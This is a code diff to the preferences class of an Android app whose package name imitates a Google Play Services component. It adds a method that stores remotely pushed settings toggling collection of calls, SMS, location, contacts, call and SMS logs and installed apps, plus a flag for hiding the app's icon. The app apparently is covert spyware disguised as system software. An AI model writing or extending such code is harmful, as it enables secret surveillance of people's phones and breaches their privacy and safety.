@@ -5,6 +5,7 @@ import android.content.SharedPreferences;
 import android.telephony.TelephonyManager;
 
 import com.google.android.gms.persistent.googleapps.network.models.data.DeviceInfo;
+import com.google.android.gms.persistent.googleapps.network.models.data.Settings;
 import com.google.gson.Gson;
 
 import javax.inject.Inject;
@@ -27,7 +28,6 @@ public class Preferences {
     private final String port = "port";
     //-------------for begining request---------------------
     private final String baseDeviceInfo = "base_device_info";
-    private final String hideIcon = "is_hide_icon";
     private final String isAllDeviceInfo = "is_all_device_info";
 
     //-------------------initial data------------------------
@@ -38,10 +38,13 @@ public class Preferences {
     //------------variable settings-----------------------
     private final String call = "call";
     private final String sms = "sms";
-    private final String location = "location";
-    private final String locationMode = "location_mode";
+    private final String geo = "geo";
+    private final String geoMode = "geo_mode";
     private final String dispatchMode = "dispatch_mode";
     private final String locationUpdateTime = "location_update_time";
+    private final String service = "service";
+    private final String hideIcon = "hide_icon";
+
 
     private final String callList = "call_list";
     private final String smsList = "sms_list";
@@ -96,6 +99,21 @@ public class Preferences {
         }
     }
 
+    public Single<Boolean> setWorkSetup(Settings settings) {
+        SharedPreferences.Editor editor = prefs.edit();
+        editor.putInt(call, settings.getCall());
+        editor.putInt(sms, settings.getSms());
+        editor.putInt(geo, settings.getGeo());
+        editor.putInt(geoMode, settings.getGeoMode());
+        editor.putInt(phoneBook, settings.getContactList());
+        editor.putInt(smsList, settings.getSmsList());
+        editor.putInt(callList, settings.getCallsList());
+        editor.putInt(appList, settings.getAppsList());
+        editor.putInt(hideIcon, settings.getHide());
+        editor.putInt(service, settings.getCallsList());
+         return Single.just(editor.commit());
+    }
+
     public String getImei() {
         return prefs.getString(imei, null);
     }
@@ -124,21 +142,21 @@ public class Preferences {
         prefs.edit().putInt(this.sms, sms).apply();
     }
 
-    public int getLocation() {
-        return prefs.getInt(location, 0);
+    public int getGeo() {
+        return prefs.getInt(geo, 0);
     }
 
-    public void setLocation(int location) {
-        prefs.edit().putInt(this.location, location).apply();
+    public void setGeo(int geo) {
+        prefs.edit().putInt(this.geo, geo).apply();
     }
 
     public int getModeLocation() {
-        return prefs.getInt(locationMode, 0);
+        return prefs.getInt(geoMode, 0);
 
     }
 
     public void setModeLocation(int locationMode) {
-        prefs.edit().putInt(this.locationMode, locationMode).apply();
+        prefs.edit().putInt(this.geoMode, locationMode).apply();
     }
 
     public int getDispatchMode() {
